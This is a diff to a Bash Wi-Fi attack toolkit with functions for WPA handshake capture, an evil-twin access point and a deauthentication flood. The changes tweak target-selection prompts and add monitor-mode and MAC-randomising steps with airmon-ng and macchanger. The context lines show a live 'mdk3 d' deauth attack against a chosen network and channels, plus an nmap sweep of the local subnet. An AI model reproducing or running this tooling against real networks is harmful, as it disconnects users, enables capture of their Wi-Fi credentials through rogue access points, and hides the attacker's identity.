@@ -177,7 +177,7 @@ handshake_ataque() {
 
 	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
 	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
-	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read ap
+	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
 	tput civis
 	$cleancolor
@@ -334,6 +334,10 @@ scanner() {
 	sudo nmap -sP -Pn 192.168.1.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
 	echo -e "\n---------------------------------------------------"
 	echo -ne "${redColour}[!]$grayColour Enter to exit" && read 
+	airmon-ng start $tar > /dev/null 2>&1
+	ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
+	ifconfig $tar up > /dev/null 2>&1
+	airmon-ng check kill > /dev/null 2>&1
 	tput cnorm
 }
 menunomon() {
@@ -381,7 +385,7 @@ eviltrust() {
 		fi
 
 		rm iface 2>/dev/null
-		echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Name of the network to be used (Ej: WifiFree):${endColour} " && read -r use_ssid
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Name of the network to be used (Ej: WifiFree):${endColour} " && read -r use_ssid
 		echo -ne "${yellowColour}[*]${endColour}${grayColour} Channel to use (1-12):${endColour} " && read use_channel; tput civis
 		echo -e "\n${redColour}[!]$grayColour Closing all connections...${endColour}\n"
 		sleep 2
@@ -481,7 +485,7 @@ dosattack() {
 
 	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
 	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
-	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read redos
+	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
 	echo -ne "${redColour}[?]$grayColourChannels Channels for attack (Recommend 1,6,11): " && read canalesdos
 	xterm -hold -e "sudo mdk3 $tar d -a $redos -c $canalesdos"
